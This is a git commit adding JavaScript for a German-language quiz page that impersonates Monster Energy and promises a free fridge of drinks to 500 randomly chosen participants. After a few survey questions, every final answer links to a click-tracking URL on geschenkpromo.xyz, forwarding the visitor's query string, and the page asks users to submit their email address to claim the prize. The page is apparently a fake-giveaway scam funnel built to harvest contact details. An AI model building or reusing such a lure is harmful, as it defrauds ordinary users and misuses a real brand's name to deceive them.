25fe56bc63661ab45542478ab8d48d5422725fb9
monsterwin3 <63346878+monsterwin3@users.noreply.github.com>
2020-04-24 15:13:41 +0300

    Add files via upload

---
+++ js/quiz_code.js
@@ -0,0 +1,51 @@
+window.onload = function(){
+
+    // Ссылка для последней страницы
+    var utm = window.location.search.replace( '?', ''); 
+	var link = "http://geschenkpromo.xyz/click.php?key=hko8stwg0ibql2i6iv6h&";
+	var final = link + utm;
+    let a_href = final;
+
+    let step = 0;
+
+    showQuestion();
+    document.onclick = function(event) {
+        event.stopPropagation();
+        if(event.target.classList.contains('answers__item') || event.target.classList.contains('image_btn')){
+            step++;
+            showQuestion(step);
+        }
+    }
+
+
+    function showQuestion(questionNumber){
+        let question = '';
+        for (let key in quiz[step]['q']){
+            question += `<div class="question__item">${quiz[step]['q'][key]}</div>`;
+        }
+        document.querySelector(".question").innerHTML = question;
+        let answer = '';
+        if(step == 0){
+            answer += `<div class="answers__item">${quiz[step]['a'][1]}</div>`;
+        }
+        if(step == 4){
+            console.log('asf');
+        for (let key in quiz[step]['a']){
+                answer += `<a href="${a_href}"><div class="answers__last">${quiz[step]['a'][key]}</div></a>`;
+            }
+        }
+        if(step > 0 && step < 4){
+            for (let key in quiz[step]['a']){
+                answer += `<div class="answers__item">${quiz[step]['a'][key]}</div>`;
+            }
+        }
+        document.querySelector(".answers").innerHTML = answer;
+    }
+
+    function showStart(){
+        let content__text = 'Wir wählen 500 Teilnehmer zufällig aus, denen wir einen Kühlschrank mit neuen Getränken völlig kostenlos zusenden werden. Sie müssen nur eine kurze Umfrage beantworten und ein Formular  auf der Webseite ausfüllen!';
+        document.querySelector(".content").innerHTML = `<div class="content__title">Freunde!</div>` +
+        `<div class="content__text">${content__text}</div>` + `<div class="btn">[eq]</div>`;
+    }
+}
+
---
+++ js/quiz_data.js
@@ -0,0 +1,44 @@
+const quiz = [
+    {   
+        "q": {
+            "1" :"WIhre",
+            "2" : "Wir wählen 500 Teilnehmer zufällig aus, denen wir einen Kühlschrank mit neuen Getränken völlig kostenlos zusenden werden. Sie müssen nur eine kurze Umfrage beantworten und ein Formular  auf der Webseite ausfüllen!"
+            },
+        "a" : {
+            "1": "LOS GEHT'S!"
+        }
+    },
+    {
+        "q": 
+        {"1" : "Welchen von unseren Geschmäckern bevorzugen Sie?"},
+        "a" : {
+            "1" : "- KOKOS UND HEIDELBEEREN",
+            "2" : "- MOOSBEERE",
+            "3" : "- LIMETTE",
+            "4" : "- HEIDELBEEREN",
+            "5" : "- TROPEN"
+        }
+    },
+     {
+        "q": {"1" : "Haben Sie früher schon einmal Preise von Monster Energy gewonnen?"},
+        "a" : {
+            "1": "- JA",
+            "2": "- NEIN"
+        }
+    },
+     {
+        "q": {"1" : "Würden Sie Monster Energy Ihren Freunden und Bekannten empfehlen?"},
+        "a" : {
+            "1": "- JA",
+            "2": "- NEIN"
+        }
+    },
+    {
+        "q": {
+            "1" : "Ausgezeichnet! ",
+            "2" : "Danke für Ihre Antworten. Folgen Sie jetzt dem Link zur Webseite, wo Sie Ihre E-mail-Adresse eingeben müssen, mittels welcher wir uns mit Ihnen in kürzester Zeit in Verbindung setzen können um zu erzählen, wie und wo der Preis zu erhalten ist."},
+        "a" : {
+            "1": "- FORMULAR AUSFÜLLEN"
+        }
+    }
+];
